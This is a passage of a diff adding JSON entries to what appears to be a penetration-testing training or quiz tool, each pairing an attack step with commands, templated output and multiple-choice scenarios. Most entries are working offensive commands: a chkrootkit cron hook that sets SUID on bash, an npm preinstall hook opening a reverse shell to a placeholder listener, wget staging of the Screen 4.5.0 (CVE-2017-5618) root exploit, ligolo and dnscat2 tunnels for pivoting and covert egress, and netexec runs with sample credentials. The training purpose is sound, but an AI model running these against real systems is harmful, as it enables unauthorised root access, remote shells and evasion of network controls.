+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Interactive root shell accessed via tmux session socket."
+          }
+        ]
+      },
+      "situation": "Scenario: Attach to an active root GNU Screen session running in multi-user mode. Which move should you run next?",
+      "choices": [
+        "gnu-screen-root-attach",
+        "sudo-abuse",
+        "writable-passwd",
+        "nfs-squash"
+      ],
+      "coach": {
+        "sudo-abuse": "Sudo / GTFOBins Abuse targets demonstrates administrative/root access; here the direct move is GNU Screen / Tmux Root Session Attachment.",
+        "writable-passwd": "Writable /etc/passwd targets demonstrates administrative/root access; here the direct move is GNU Screen / Tmux Root Session Attachment.",
+        "nfs-squash": "NFS no_root_squash targets demonstrates administrative/root access; here the direct move is GNU Screen / Tmux Root Session Attachment."
+      }
+    },
+    "chkrootkit-local-privesc": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once you have low-privilege access and chkrootkit (<0.49) runs periodically via root cron. The key confirmation is: Privilege escalation hook planted for next scheduled chkrootkit run.",
+      "cmd": "echo -e '#!/bin/bash\\nchmod +s /bin/bash' > /tmp/update && chmod +x /tmp/update",
+      "tool": "bash",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Privilege escalation hook planted for next scheduled chkrootkit run.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute chkrootkit Cron Execution Local Privilege Escalation, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Plant a malicious executable script named /tmp/update which chkrootkit executes unconditionally.",
+            "demo": [
+              {
+                "run": "echo -e '#!/bin/bash\\nchmod +s /bin/bash' > /tmp/update && chmod +x /tmp/update",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Privilege escalation hook planted for next scheduled chkrootkit run."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Execute bash with -p to preserve the effective root UID without dropping privileges.",
+            "demo": [
+              {
+                "run": "/bin/bash -p",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Root shell access confirmed."
+          }
+        ]
+      },
+      "situation": "Scenario: You have low-privilege access and chkrootkit (<0.49) runs periodically via root cron. Which move should you run next?",
+      "choices": [
+        "chkrootkit-local-privesc",
+        "sudo-abuse",
+        "writable-passwd",
+        "nfs-squash"
+      ],
+      "coach": {
+        "sudo-abuse": "Sudo / GTFOBins Abuse targets demonstrates administrative/root access; here the direct move is chkrootkit Cron Execution Local Privilege Escalation.",
+        "writable-passwd": "Writable /etc/passwd targets demonstrates administrative/root access; here the direct move is chkrootkit Cron Execution Local Privilege Escalation.",
+        "nfs-squash": "NFS no_root_squash targets demonstrates administrative/root access; here the direct move is chkrootkit Cron Execution Local Privilege Escalation."
+      }
+    },
+    "npm-package-privesc": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once auditing sudo permissions reveals npm install is allowed without a password. The key confirmation is: Malicious npm package created ready for privileged installation.",
+      "cmd": "mkdir -p /tmp/pkg && echo '{\"name\":\"pkg\",\"version\":\"1.0.0\",\"scripts\":{\"preinstall\":\"/bin/bash -c \\\"bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\\\"\"}}' > /tmp/pkg/package.json",
+      "tool": "bash",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Malicious npm package created ready for privileged installation.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute npm Package Lifecycle Hook Local Privilege Escalation, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Construct a package.json containing a malicious command in the preinstall lifecycle hook.",
+            "demo": [
+              {
+                "run": "mkdir -p /tmp/pkg && echo '{\"name\":\"pkg\",\"version\":\"1.0.0\",\"scripts\":{\"preinstall\":\"/bin/bash -c \\\"bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\\\"\"}}' > /tmp/pkg/package.json",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Malicious npm package created ready for privileged installation."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Run sudo npm install with -g pointing to the local package folder to invoke the hook as root.",
+            "demo": [
+              {
+                "run": "sudo /usr/bin/npm i -g /tmp/pkg",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Root privileges obtained via npm package preinstall execution."
+          }
+        ]
+      },
+      "situation": "Scenario: Auditing sudo permissions reveals npm install is allowed without a password. Which move should you run next?",
+      "choices": [
+        "npm-package-privesc",
+        "sudo-abuse",
+        "writable-passwd",
+        "nfs-squash"
+      ],
+      "coach": {
+        "sudo-abuse": "Sudo / GTFOBins Abuse targets demonstrates administrative/root access; here the direct move is npm Package Lifecycle Hook Local Privilege Escalation.",
+        "writable-passwd": "Writable /etc/passwd targets demonstrates administrative/root access; here the direct move is npm Package Lifecycle Hook Local Privilege Escalation.",
+        "nfs-squash": "NFS no_root_squash targets demonstrates administrative/root access; here the direct move is npm Package Lifecycle Hook Local Privilege Escalation."
+      }
+    },
+    "screen-suid-privesc": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once you have identified Screen 4.5.0 SUID and need to stage exploit dependencies on the target. The key confirmation is: Required helper binaries staged in writable target directory.",
+      "cmd": "cd /tmp && wget -q http://{{lhost}}:{{web_port}}/libhax.so -O /tmp/libhax.so && wget -q http://{{lhost}}:{{web_port}}/rootshell -O /tmp/rootshell && chmod +x /tmp/rootshell",
+      "tool": "wget",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Required helper binaries staged in writable target directory.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute GNU Screen 4.5.0 SUID Arbitrary Library Load Local Root (CVE-2017-5618), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Fetch precompiled libhax.so and rootshell binaries from your local HTTP staging server into /tmp.",
+            "demo": [
+              {
+                "run": "cd /tmp && wget -q http://{{lhost}}:{{web_port}}/libhax.so -O /tmp/libhax.so && wget -q http://{{lhost}}:{{web_port}}/rootshell -O /tmp/rootshell && chmod +x /tmp/rootshell",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Required helper binaries staged in writable target directory."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Invoke screen-4.5.0 with logfile redirection to write /tmp/libhax.so path into /etc/ld.so.preload, then trigger execution.",
+            "demo": [
+              {
+                "run": "cd /etc && umask 000 && screen-4.5.0 -D -m -L ld.so.preload echo -ne \"\\x0a/tmp/libhax.so\" && screen-4.5.0 -ls; /tmp/rootshell",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Instant root shell spawned via Screen 4.5.0 SUID arbitrary preload abuse."
+          }
+        ]
+      },
+      "situation": "Scenario: You have identified Screen 4.5.0 SUID and need to stage exploit dependencies on the target. Which move should you run next?",
+      "choices": [
+        "screen-suid-privesc",
+        "sudo-abuse",
+        "writable-passwd",
+        "nfs-squash"
+      ],
+      "coach": {
+        "sudo-abuse": "Sudo / GTFOBins Abuse targets demonstrates administrative/root access; here the direct move is GNU Screen 4.5.0 SUID Arbitrary Library Load Local Root (CVE-2017-5618).",
+        "writable-passwd": "Writable /etc/passwd targets demonstrates administrative/root access; here the direct move is GNU Screen 4.5.0 SUID Arbitrary Library Load Local Root (CVE-2017-5618).",
+        "nfs-squash": "NFS no_root_squash targets demonstrates administrative/root access; here the direct move is GNU Screen 4.5.0 SUID Arbitrary Library Load Local Root (CVE-2017-5618)."
+      }
+    },
+    "flag-hunt-root-linux": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. The key confirmation is: The root flag prints beneath uid=0(root).",
+      "cmd": "whoami; id; hostname; ip -4 addr | grep inet; cat {{flag_path_root}}",
+      "tool": "cat",
+      "output": "root\nuid=0(root) gid=0(root) groups=0(root)\ntarget\n    inet 10.10.10.10/24 brd 10.10.10.255 scope global eth0\nf8c3a91e4b207d6510a2e8c94b3f7d12",
+      "signal": "f8c3a91e4b207d6510a2e8c94b3f7d12",
+      "teach": "The root flag prints beneath uid=0(root) alongside hostname and IP.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Capture the Root Flag (Linux), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Locate and print the root flag",
+            "d": "You are root now, so locate and read the proof flag in /root alongside your identity and IP.",
+            "demo": [
+              {
+                "run": "whoami; id; hostname; ip -4 addr | grep inet; find / -xdev -type f -size -4k \\( {{flag_inames_linux}} \\) 2>/dev/null -exec echo '--- {} ---' \\; -exec cat {} \\;",
+                "out": "root\nuid=0(root) gid=0(root) groups=0(root)\ntarget\n    inet 10.10.10.10/24 brd 10.10.10.255 scope global eth0\n--- /root/root.txt ---\nf8c3a91e4b207d6510a2e8c94b3f7d12",
+                "sig": "f8c3a91e4b207d6510a2e8c94b3f7d12"
+              }
+            ],
+            "note": "The root flag prints beneath uid=0(root)."
+          },
+          {
+            "t": "Capture located root flag",
+            "d": "Once the exact path is known, print whoami, id, hostname, ip addr, and the root flag in one frame.",
+            "demo": [
+              {
+                "run": "whoami; id; hostname; ip -4 addr | grep inet; cat {{flag_path_root}}",
+                "out": "root\nuid=0(root) gid=0(root) groups=0(root)\ntarget\n    inet 10.10.10.10/24 brd 10.10.10.255 scope global eth0\nf8c3a91e4b207d6510a2e8c94b3f7d12",
+                "sig": "f8c3a91e4b207d6510a2e8c94b3f7d12"
+              }
+            ],
+            "note": "The root flag and root identity print in one screenshot frame."
+          },
+          {
+            "t": "Remote SSH locate",
+            "d": "When root SSH credentials are known, locate the flag in /root over SSH.",
+            "demo": [
+              {
+                "run": "nxc ssh {{target}} -u '{{user}}' -p '{{password}}' -x 'find /root -maxdepth 2 -type f \\( {{flag_inames_linux}} \\) 2>/dev/null'",
+                "out": "SSH         10.10.10.10     22     target           [+] root:P@ssw0rd123! (Pwn3d!)\nSSH         10.10.10.10     22     target           /root/root.txt",
+                "sig": "/root/root.txt"
+              }
+            ],
+            "note": "The root flag path prints so the proof read fills automatically."
+          }
+        ]
+      },
+      "situation": "You need to verify capture the root flag (linux). Which move fits best?",
+      "choices": [
+        "flag-hunt-root-linux",
+        "flag-hunt-linux",
+        "flag-hunt-windows",
+        "flag-hunt-root-windows"
+      ],
+      "coach": {
+        "flag-hunt-linux": "Capture the User Flag (Linux) targets a different precondition; here the direct move is Capture the Root Flag (Linux).",
+        "flag-hunt-windows": "Capture the User Flag (Windows) targets a different precondition; here the direct move is Capture the Root Flag (Linux).",
+        "flag-hunt-root-windows": "Capture the Root/Proof Flag (Windows) targets a different precondition; here the direct move is Capture the Root Flag (Linux)."
+      }
+    },
+    "flag-hunt-root-windows": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. Capture the proof flag alongside whoami, hostname, and ipconfig in an interactive shell on the host.",
+      "cmd": "cmd /c \"whoami & hostname & ipconfig & type {{flag_path_root}}\"",
+      "tool": "cmd",
+      "output": "active\\administrator\nDC\n\nWindows IP Configuration\n\nEthernet adapter Ethernet0:\n   IPv4 Address. . . . . . . . . . . : 10.10.10.100\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : 10.10.10.2\ne3b0c44298fc1c149afbf4c8996fb924",
+      "signal": "e3b0c44298fc1c149afbf4c8996fb924",
+      "teach": "Wrapping with cmd /c \"whoami & hostname & ipconfig & type ...\" works identically in CMD (impacket-wmiexec, psexec, smbexec) and PowerShell (Evil-WinRM).",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Capture the Root/Proof Flag (Windows), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Universal in-session proof read",
+            "d": "Runs in both CMD (impacket-wmiexec, psexec, smbexec) and PowerShell (Evil-WinRM) to print identity, hostname, IP, and the proof flag in one frame.",
+            "demo": [
+              {
+                "run": "cmd /c \"whoami & hostname & ipconfig & type {{flag_path_root}}\"",
+                "out": "active\\administrator\nDC\n\nWindows IP Configuration\n\nEthernet adapter Ethernet0:\n   IPv4 Address. . . . . . . . . . . : 10.10.10.100\ne3b0c44298fc1c149afbf4c8996fb924",
+                "sig": "e3b0c44298fc1c149afbf4c8996fb924"
+              }
+            ],
+            "note": "Captures whoami, hostname, ipconfig, and the root/proof flag in a single screenshot frame."
+          },
+          {
+            "t": "Remote locate over SMB",
+            "d": "Searches every Desktop for root/proof flags in under a second and fills {{flag_path_root}}.",
+            "demo": [
+              {
+                "run": "nxc smb {{target}} -u {{dauser}} -H {{dahash}} -x 'for /d %d in (C:\\Users\\*) do @dir /b /s \"%d\\Desktop\\*root*.txt\" \"%d\\Desktop\\*proof*.txt\" 2>nul'",
+                "out": "SMB         10.10.10.100    445    DC               [+] active.htb\\Administrator:32ed87bdb5fdc5e9cba88547376818d4 (Pwn3d!)\nSMB         10.10.10.100    445    DC               C:\\Users\\Administrator\\Desktop\\root.txt",
+                "sig": "C:\\Users\\Administrator\\Desktop\\root.txt"
+              }
+            ],
+            "note": "The search finds root.txt / proof.txt and prints its exact path."
+          },
+          {
+            "t": "Remote locate over WMI",
+            "d": "Sweeps every user profile Desktop over WMI (port 135) and prints the matching flag path.",
+            "demo": [
+              {
+                "run": "nxc wmi {{target}} -u '{{user}}' -p '{{password}}' -d {{domain}} -x 'for /d %d in (C:\\Users\\*) do @dir /b /s \"%d\\Desktop\\*root*.txt\" \"%d\\Desktop\\*proof*.txt\" 2>nul'",
+                "out": "WMI         10.10.10.100    135    DC               [+] active.htb\\Administrator:Ticketmaster1968 (Pwn3d!)\nWMI         10.10.10.100    135    DC               C:\\Users\\Administrator\\Desktop\\root.txt",
+                "sig": "C:\\Users\\Administrator\\Desktop\\root.txt"
+              }
+            ],
+            "note": "The root/proof flag path prints over WMI."
+          }
+        ]
+      },
+      "situation": "Scenario: Only if the proof flag is NOT on Administrator's Desktop (rare). Which move should you run next?",
+      "choices": [
+        "flag-hunt-root-windows",
+        "flag-hunt-linux",
+        "flag-hunt-root-linux",
+        "flag-hunt-windows"
+      ],
+      "coach": {
+        "flag-hunt-linux": "Capture the User Flag (Linux) targets a different precondition; here the direct move is Capture the Root/Proof Flag (Windows).",
+        "flag-hunt-root-linux": "Capture the Root Flag (Linux) targets a different precondition; here the direct move is Capture the Root/Proof Flag (Windows).",
+        "flag-hunt-windows": "Capture the User Flag (Windows) targets a different precondition; here the direct move is Capture the Root/Proof Flag (Windows)."
+      }
+    },
+    "ligolo-tunnel-pivot": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once you need to prepare Kali to receive an inbound routed tunnel connection from a pivot agent. The key confirmation is: Local tunnel endpoint configured and listener ready for callbacks.",
+      "cmd": "sudo ip tuntap add user {{kali_user}} mode tun dev ligolo && sudo ip link set ligolo up && ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
+      "tool": "ligolo-proxy",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Local tunnel endpoint configured and listener ready for callbacks.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Ligolo-ng TUN Interface Pivot and Internal Subnet Routing, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Create local TUN interface, set it UP, and start ligolo-proxy listener on port 11601.",
+            "demo": [
+              {
+                "run": "sudo ip tuntap add user {{kali_user}} mode tun dev ligolo && sudo ip link set ligolo up && ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Local tunnel endpoint configured and listener ready for callbacks."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Run ligolo agent executable on foothold pointing back to your Kali IP and port.",
+            "demo": [
+              {
+                "run": "agent.exe -connect {{lhost}}:11601 -ignore-cert",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Encrypted pivot tunnel session established between foothold and Kali."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Add routing table entry on Kali directing the target internal subnet through dev ligolo.",
+            "demo": [
+              {
+                "run": "sudo ip route add {{internal_subnet}} dev ligolo",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Transparent IP routing into target internal network established."
+          }
+        ]
+      },
+      "situation": "Scenario: You need to prepare Kali to receive an inbound routed tunnel connection from a pivot agent. Which move should you run next?",
+      "choices": [
+        "ligolo-tunnel-pivot",
+        "local-linux-interfaces",
+        "local-linux-routes",
+        "local-linux-neighbors"
+      ],
+      "coach": {
+        "local-linux-interfaces": "Enumerate Linux interfaces targets a different precondition; here the direct move is Ligolo-ng TUN Interface Pivot and Internal Subnet Routing.",
+        "local-linux-routes": "Enumerate Linux routes targets a different precondition; here the direct move is Ligolo-ng TUN Interface Pivot and Internal Subnet Routing.",
+        "local-linux-neighbors": "Enumerate Linux ARP neighbors targets a different precondition; here the direct move is Ligolo-ng TUN Interface Pivot and Internal Subnet Routing."
+      }
+    },
+    "dns-tunnel": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once first confirm direct egress is actually blocked before reaching for a DNS tunnel. The key confirmation is: You confirm direct egress is blocked, so a DNS tunnel is justified.",
+      "cmd": "nslookup -type=txt test.{{domain}} {{target}}",
+      "tool": "sh",
+      "output": "test.acme.internal   text = \"tunnel-ready\"",
+      "signal": "tunnel-ready",
+      "teach": "The box can resolve arbitrary names against a server you control, so DNS is a viable channel. Stand up a dnscat2 or iodine server on your box and run the client on the target to open the tunnel.",
+      "leadup": [
+        {
+          "key": "egress",
+          "label": "Other egress is blocked",
+          "steps": [
+            {
+              "title": "Only DNS gets out",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "curl -m 5 http://{{lhost}} || echo blocked; nslookup {{lhost}} 2>/dev/null | head -1",
+              "out": "blocked\nServer:  10.10.14.5",
+              "sig": "blocked",
+              "teach": "HTTP is filtered but DNS resolves, which is exactly when a DNS tunnel is the way out."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "A DNS tunnel is confirm DNS egress, run the server on your box, run the client on the target, then pivot through it.",
+        "items": [
+          {
+            "t": "Confirm DNS is your only channel",
+            "d": "Test the fast transports first; a DNS tunnel is slow, so use it only when a reverse shell and an SSH tunnel are both blocked.",
+            "demo": [
+              {
+                "run": "curl -m 5 http://{{lhost}} || echo blocked",
+                "out": "blocked",
+                "sig": "blocked"
+              }
+            ],
+            "note": "If anything faster works, use that instead."
+          },
+          {
+            "t": "Run the tunnel server on your box",
+            "d": "dnscat2 (or iodine) listens on your attacker box as the authoritative handler for a domain you control.",
+            "demo": [
+              {
+                "run": "dnscat2-server {{domain}}",
+                "out": "Starting DNS server on 0.0.0.0:53 for domain {{domain}}",
+                "sig": "Starting DNS server",
+                "teach": ""
+              }
+            ],
+            "note": "You need a domain delegated to your server, or a direct nameserver the target can reach."
+          },
+          {
+            "t": "Run the client on the target",
+            "d": "The client encodes its traffic into queries for your domain, which your server decodes into a session.",
+            "demo": [
+              {
+                "run": "./dnscat {{domain}}",
+                "out": "Session established!",
+                "sig": "Session established!",
+                "teach": ""
+              }
+            ],
+            "note": "The session is interactive but slow; keep commands terse."
+          },
+          {
+            "t": "Pivot through the tunnel",
+            "d": "Use the session as a shell, or forward a port through it to reach services the box can see but you cannot.",
+            "demo": [
+              {
+                "run": "dnscat2> window -i 1",
+                "out": "command (target) 1>",
+                "sig": "command (target)",
+                "teach": ""
+              }
+            ],
+            "note": "From here the normal pivoting workflow applies, just over DNS."
+          }
+        ]
+      },
+      "situation": "Your foothold can resolve DNS but every other outbound port is filtered, so a reverse shell will not connect. What is the move?",
+      "choices": [
+        "dns-tunnel",
+        "pivot-chisel-socks",
+        "shell-revshell-linux",
+        "pivot-ligolo"
+      ],
+      "coach": {
+        "pivot-chisel-socks": "chisel needs an open TCP port outbound, which is blocked here; DNS is the only channel.",
+        "shell-revshell-linux": "A reverse shell cannot connect when outbound TCP is filtered; tunnel over DNS instead.",
+        "pivot-ligolo": "ligolo also needs TCP egress; when only DNS resolves, dnscat2/iodine is the escape hatch."
+      }
+    },
+    "pivot-enumerate-neighbors": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once from the pivot: sweep the adjacent hosts you just learned about. The key confirmation is: You map which neighbors are alive and interesting.",
+      "cmd": "nxc smb {{neighbor_hosts}}",
+      "tool": "nxc",
+      "output": "SMB  10.10.10.10  445  SRV01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV01) (domain:acme.internal) (signing:False) (SMBv1:False)",
+      "signal": "signing:False",
+      "teach": "You map which neighbors are alive and interesting.",
+      "leadup": [
+        {
+          "key": "dualhomed",
+          "label": "You discovered a second internal subnet on a compromised host",
+          "steps": [
+            {
+              "title": "Check network interfaces on the pivot host",
+              "tool": "ip",
+              "where": "target",
+              "cmd": "ip -br a",
+              "out": "lo               UNKNOWN        127.0.0.1/8\neth0             UP             10.10.10.10/24\neth1             UP             172.16.5.5/24",
+              "sig": "172.16.5.5/24",
+              "teach": "The second interface (172.16.5.5/24) or a localhost-only port is unreachable directly from Kali without a tunnel."
+            }
+          ]
+        },
+        {
+          "key": "localport",
+          "label": "An internal service is bound to 127.0.0.1",
+          "steps": [
+            {
+              "title": "List localhost listeners on the target",
+              "tool": "ss",
+              "where": "target",
+              "cmd": "ss -tulpn",
+              "out": "tcp   LISTEN 0      128    127.0.0.1:8080      0.0.0.0:*",
+              "sig": "127.0.0.1:8080",
+              "teach": "Forwarding 127.0.0.1:8080 back to Kali lets you attack the internal service with your full toolkit."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Sweep the Adjacent Hosts, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "nxc smb across the neighbor list is a fast first look (signing, OS, names).",
+            "demo": [
+              {
+                "run": "nxc smb {{neighbor_hosts}}",
+                "out": "SMB  10.10.10.10  445  SRV01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV01) (domain:acme.internal) (signing:False) (SMBv1:False)",
+                "sig": "signing:False"
+              }
+            ],
+            "note": "You map which neighbors are alive and interesting."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "nmap -sV -Pn against the neighbors.",
+            "demo": [
+              {
+                "run": "nmap -sV -Pn {{neighbor_hosts}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Service detail across the neighbors."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "proxychains nmap -sT -Pn -n across the neighbors.",
+            "demo": [
+              {
+                "run": "proxychains -q nmap -sT -Pn -n {{neighbor_hosts}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Internal neighbors enumerated through the tunnel."
+          }
+        ]
+      },
+      "situation": "Scenario: From the pivot: sweep the adjacent hosts you just learned about. Which move should you run next?",
+      "choices": [
+        "pivot-enumerate-neighbors",
+        "local-linux-interfaces",
+        "local-linux-routes",
+        "local-linux-neighbors"
+      ],
+      "coach": {
+        "local-linux-interfaces": "Enumerate Linux interfaces targets a different precondition; here the direct move is Sweep the Adjacent Hosts.",
